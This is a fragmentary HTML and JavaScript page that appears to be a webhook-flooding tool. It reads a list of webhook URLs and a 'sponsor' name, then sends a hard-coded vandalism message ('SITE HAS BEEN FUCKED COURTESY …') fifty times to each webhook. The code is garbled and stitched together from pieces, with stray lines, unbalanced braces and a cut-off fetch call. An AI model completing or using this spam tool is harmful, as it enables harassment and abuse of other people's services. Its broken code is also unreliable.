<html lang="en">

<body>

<textarea id="sponsor" placeholder="the thing you are sponsoring"></textarea>

    var raw2 = document.getElementById("sponsor").value.trim()

}, 1);

    // ðŸ”’ HARD-CODED SETTINGS
    const SEND_COUNT = 50; // times per webhook
    const MESSAGE = "SITE HAS BEEN FUCKED\nCOURTESY " + raw2;

    async function send() {
      const raw = document.getElementById("webhooks").value.trim();
      var raw2 = document.getElementById("sponsor").value.trim();
      if (!raw) return alert("At least one webhook is required");

      const webhooks = raw
        .split("\n")
        .map(w => w.trim())
        .filter(Boolean);

      const button = document.querySelector("button");
      button.disabled = true;

      for (const url of webhooks) {
        for (let i = 0; i < SEND_COUNT; i++) {
          try {
            await fetch(url, {

          } catch (e) {

      alert(`Sent "${MESSAGE}" ${SEND_COUNT} time(s) to ${webhooks.length} webhook(s)`);
